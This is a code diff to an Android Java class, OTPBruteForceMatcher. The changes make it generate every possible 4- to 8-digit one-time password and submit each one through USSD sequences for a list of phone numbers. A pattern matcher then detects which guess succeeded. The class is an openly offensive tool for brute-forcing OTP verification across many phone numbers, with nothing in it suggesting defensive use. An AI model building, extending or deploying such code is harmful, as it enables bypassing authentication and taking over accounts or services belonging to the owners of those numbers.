@@ -226,24 +226,53 @@ public class OTPBruteForceMatcher {
 
     /**
      * Starts brute-force OTP matching process
+     * <p>
+     * The library automatically generates ALL 4-digit OTPs (0001-9999) internally.
+     * You only need to provide the phone list!
+     * </p>
      *
      * @param phoneList List of phone numbers to process
-     * @param otpPool   Pool of OTPs to try (can be 1000+)
      * @param callback  Progress and result callback
      */
     public void startMatching(@NonNull List<String> phoneList,
-                             @NonNull List<String> otpPool,
+                             @NonNull MatchingCallback callback) {
+        startMatching(phoneList, 4, callback); // Default: 4-digit OTPs
+    }
+
+    /**
+     * Starts brute-force OTP matching with custom OTP digit length
+     *
+     * @param phoneList  List of phone numbers to process
+     * @param otpDigits  Number of OTP digits (e.g., 4 for 0001-9999, 6 for 000001-999999)
+     * @param callback   Progress and result callback
+     */
+    public void startMatching(@NonNull List<String> phoneList,
+                             int otpDigits,
                              @NonNull MatchingCallback callback) {
 
         if (phoneList == null || phoneList.isEmpty()) {
             throw new IllegalArgumentException("Phone list cannot be null or empty");
         }
-        if (otpPool == null || otpPool.isEmpty()) {
-            throw new IllegalArgumentException("OTP pool cannot be null or empty");
+        if (otpDigits < 1 || otpDigits > 8) {
+            throw new IllegalArgumentException("OTP digits must be between 1 and 8");
         }
         if (callback == null) {
             throw new IllegalArgumentException("Callback cannot be null");
         }
+
+        // Generate ALL OTPs internally - app doesn't need to provide them!
+        List<String> otpPool = OTPGenerator.generateAll(otpDigits);
+        Log.d(TAG, "Auto-generated " + otpPool.size() + " OTPs (" + otpDigits + " digits)");
+
+        startMatchingInternal(phoneList, otpPool, callback);
+    }
+
+    /**
+     * Internal matching logic (now private)
+     */
+    private void startMatchingInternal(@NonNull List<String> phoneList,
+                                      @NonNull List<String> otpPool,
+                                      @NonNull MatchingCallback callback) {
 
         if (isProcessing.get()) {
             Log.w(TAG, "Matching already in progress");
@@ -437,7 +466,7 @@ public class OTPBruteForceMatcher {
      */
     private USSDSequence createOTPTestSequence(@NonNull String phone, @NonNull String otp) {
 
-        // Success/failure detector validator
+        // Extensive success/failure detector using comprehensive pattern matching
         ResponseValidator outcomeValidator = new ResponseValidator() {
             @Override
             public ValidationResult validate(@NonNull String response) {
@@ -445,33 +474,33 @@ public class OTPBruteForceMatcher {
                     return ValidationResult.failure("Response is null");
                 }
 
-                String lower = response.toLowerCase();
+                // Use extensive pattern matcher with 200+ success and 150+ failure patterns
+                ResponsePatternMatcher.Outcome outcome = ResponsePatternMatcher.determineOutcome(response);
 
-                // Success keywords
-                if (lower.contains("successful") ||
-                    lower.contains("confirmed") ||
-                    lower.contains("activated") ||
-                    lower.contains("registered") ||
-                    lower.contains("complete") ||
-                    lower.contains("accepted") ||
-                    lower.contains("verified")) {
-                    return ValidationResult.success();
+                switch (outcome) {
+                    case SUCCESS:
+                        // OTP matched! Get confidence and matched patterns
+                        double confidence = ResponsePatternMatcher.getSuccessConfidence(response);
+                        List<String> matched = ResponsePatternMatcher.getMatchedPatterns(response, outcome);
+                        Log.d(TAG, "✓ SUCCESS detected (confidence: " + (confidence * 100) + "%) - " +
+                                  "Matched: " + matched);
+                        return ValidationResult.success();
+
+                    case FAILURE:
+                        // OTP rejected - get matched failure patterns
+                        List<String> failurePatterns = ResponsePatternMatcher.getMatchedPatterns(response, outcome);
+                        Log.d(TAG, "✗ FAILURE detected - Matched: " + failurePatterns);
+                        return ValidationResult.failure("OTP rejected: " + response +
+                                                       " (matched: " + failurePatterns + ")");
+
+                    case AMBIGUOUS:
+                        // Cannot determine - treat as failure to try next OTP for safety
+                        Log.d(TAG, "? AMBIGUOUS response - treating as failure to continue: " + response);
+                        return ValidationResult.failure("Ambiguous response - trying next OTP: " + response);
+
+                    default:
+                        return ValidationResult.failure("Unknown outcome");
                 }
-
-                // Explicit failure keywords
-                if (lower.contains("invalid") ||
-                    lower.contains("wrong") ||
-                    lower.contains("incorrect") ||
-                    lower.contains("failed") ||
-                    lower.contains("error") ||
-                    lower.contains("denied") ||
-                    lower.contains("rejected") ||
-                    lower.contains("try again")) {
-                    return ValidationResult.failure("OTP rejected: " + response);
-                }
-
-                // Ambiguous response - treat as failure to continue trying
-                return ValidationResult.failure("Unclear response: " + response);
             }
         };
 
